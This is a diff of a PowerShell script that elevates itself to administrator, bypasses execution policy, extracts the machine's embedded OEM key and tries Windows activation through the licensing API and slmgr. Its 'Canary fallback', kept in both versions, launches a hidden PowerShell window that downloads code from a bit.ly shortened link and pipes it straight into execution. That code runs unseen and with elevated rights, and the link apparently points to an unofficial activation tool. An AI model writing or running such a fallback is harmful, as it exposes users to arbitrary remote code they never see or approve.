@@ -1,22 +1,14 @@
-# Auto-elevate and set execution policy for the session
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+# --- Step 1: Ensure Admin & Step 2: Set Execution Policy ---
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 
-# Helper: Check activation status quickly
-function Is-Activated {
-    try {
-        $p = Get-CimInstance -ClassName SoftwareLicensingProduct | Where-Object { $_.Description -like "Windows*" -and $_.LicenseStatus -eq 1 }
-        return $p.Count -ge 1
-    } catch { return $false }
-}
-
+# --- Step 3: Extract OEM Key & Display ---
 $oemKey = try { (Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction Stop).OA3xOriginalProductKey } catch { $null }
-
 if ($oemKey) {
-    Write-Host "OEM Key: $oemKey" -ForegroundColor Cyan
+    Write-Host "OEM Key extracted: $oemKey" -ForegroundColor Cyan
 } else {
     Write-Host "No embedded OEM key detected."
     Write-Host "Executing Canary fallback..."
@@ -24,47 +16,62 @@ if ($oemKey) {
     exit
 }
 
-# Already activated? Exit.
+# --- Helper: Check Activation Status ---
+function Is-Activated {
+    try {
+        $p = Get-CimInstance -ClassName SoftwareLicensingProduct | Where-Object { $_.Description -like "Windows*" -and $_.LicenseStatus -eq 1 }
+        return $p.Count -ge 1
+    } catch { return $false }
+}
+
 if (Is-Activated) {
     Write-Host "Windows is already activated. No action needed."
     exit
 }
 
-# ---- SLMGR activation ----
+# --- Step 4A: Attempt Activation with Modern API ---
+Write-Host "Modern API: Attempting activation with OEM key..."
+$activated = $false
+try {
+    $svc = Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction Stop
+    $null = $svc.InstallProductKey($oemKey)
+    Start-Sleep -Seconds 1
+    $null = $svc.RefreshLicenseStatus()
+    Start-Sleep -Seconds 1
+    $activated = Is-Activated
+    if ($activated) {
+        Write-Host "Modern API: Activation SUCCESSFUL."
+        exit
+    } else {
+        Write-Host "Modern API: Activation FAILED."
+    }
+} catch {
+    Write-Host "Modern API: Activation FAILED."
+}
+
+# --- Step 4B: Attempt SLMGR Activation ---
 Write-Host "SLMGR: Attempting activation with OEM key..."
 try {
     & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ipk $oemKey | Out-Null
     & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ato | Out-Null
-    Start-Sleep -Milliseconds 600
-    if (Is-Activated) {
+    Start-Sleep -Milliseconds 700
+    $activated = Is-Activated
+    if ($activated) {
         Write-Host "SLMGR: Activation SUCCESSFUL."
         exit
     } else {
         Write-Host "SLMGR: Activation FAILED."
     }
-} catch {}
+} catch {
+    Write-Host "SLMGR: Activation FAILED."
+}
 
-# ---- WMI activation ----
-Write-Host "WMI: Attempting activation with OEM key..."
-try {
-    $svc = Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction SilentlyContinue
-    $svc | Invoke-CimMethod -MethodName InstallProductKey -Arguments @{ ProductKey = $oemKey } -ErrorAction SilentlyContinue | Out-Null
-    $products = Get-CimInstance -ClassName SoftwareLicensingProduct -ErrorAction SilentlyContinue | Where-Object { $_.PartialProductKey -ne $null -and $_.ApplicationId -eq '55c92734-d682-4d71-983e-d6ec3f16059f' -and -not $_.LicenseIsAddon }
-    foreach ($product in $products) {
-        try {
-            $res = Invoke-CimMethod -InputObject $product -MethodName Activate -ErrorAction SilentlyContinue
-            if ($res.ReturnValue -eq 0) {
-                Write-Host "WMI: Activation SUCCESSFUL."
-                exit
-            }
-        } catch {}
-    }
-    Write-Host "WMI: Activation FAILED."
-} catch {}
-
-# ---- Canary fallback ----
+# --- Step 4C: Move to Canary Fallback ---
 Write-Host "Executing Canary fallback..."
 try {
     Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
 } catch {}
 exit
+
+# --- Step 5: Cleanup & Exit (handled by normal PowerShell cleanup/exit) ---
+
